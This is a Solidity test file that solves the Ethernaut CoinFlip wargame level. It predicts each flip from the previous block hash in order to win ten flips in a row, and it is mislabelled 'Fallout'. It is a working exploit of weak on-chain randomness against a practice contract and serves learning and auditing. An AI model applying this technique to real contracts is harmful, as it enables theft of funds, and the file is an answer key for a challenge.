pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../CoinFlip/CoinFlipFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract FalloutTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFalloutHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        for (uint256 i = 0; i < 10; i++) {
            // emit log_named_uint("block.number", block.number - 1);
            // blockhash(block.number) is always zero because it is determined after the block is mined.
            uint256 num = uint256(blockhash(block.number - 1));
            // emit log_named_uint("num", num);
            ethernautCoinFlip.flip(num / FACTOR == 1);
            vm.roll(block.number + 1);
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
